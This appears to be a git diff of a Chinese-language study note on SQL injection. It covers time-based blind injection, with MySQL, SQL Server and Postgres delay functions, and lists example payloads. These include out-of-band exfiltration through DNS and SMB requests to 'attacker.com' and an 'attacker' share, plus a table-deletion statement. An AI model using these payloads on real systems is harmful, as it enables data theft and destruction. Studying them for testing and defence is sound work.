@@ -19,14 +19,16 @@ temp
 
 基于时间的盲注(Time-Based Blind SQL Injection Attacks)原理：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
 
-* 无害验证payload - 验证该漏洞是否存在
+* 无害验证payload - 验证SQLi漏洞是否存在
   * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒
-* 攻击利用payload - 利用该漏洞进行"数据获取"
-  * 基于时间的盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
+* 攻击利用payload - 利用SQLi漏洞进行"数据获取"
+  * 方法1 利用"带外请求"获取数据
+    * MySQL 发出DNS请求 - `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select version()),'.attacker.com\\abc'));`
+  * 方法2 利用 "延时函数" 与 条件语法(Condition syntax) 得到True/False 逐个字符判断即可得到完整字符串值
     * 参考[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/) 和 [Timing-based Blind SQL Attacks](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
-      * MySQL`SLEEP(time)` `BENCHMARK(count, expr)`
-      * SQL Server`WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
-      * Postgres `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
+      * MySQL"延时函数" `SLEEP(time)` `BENCHMARK(count, expr)`
+      * SQL Server"延时函数" `WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
+      * Postgres"延时函数" `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
       * ...
 
 #### 类型3 - "基于报错的SQL注入"(error-based)
@@ -53,10 +55,10 @@ temp
 [SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)
 
 * 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
-  * DNS Requests - `LOAD_FILE`可以发出DNS请求
-    * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
-  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
-    * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
+  * DNS Requests
+    * MySQL `LOAD_FILE`函数可发出DNS请求
+  * SMB Requests
+    * MySQL - `INTO OUTFILE`可以发出SMB请求  如 `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
 * 数据删除
   * MySQL `DELETE FROM some_table WHERE 1; --`
 * 绕过判断
@@ -147,7 +149,8 @@ mysql> DEALLOCATE PREPARE prod;
 
 #### 数据获取 - 二分法
 
-数据获取:自写脚本 利用SQL注入漏洞获取数据(用二分法"加速判断" 缩短数据获取所需时长)
+数据获取:自写脚本 利用SQL注入漏洞获取数据(用二分法"加速判断" 缩短判断次数 即缩短数据获取总时长)
+
 ```
 test.get_version() #获取版本号
 test.get_user_first() #获取数据库用户权限
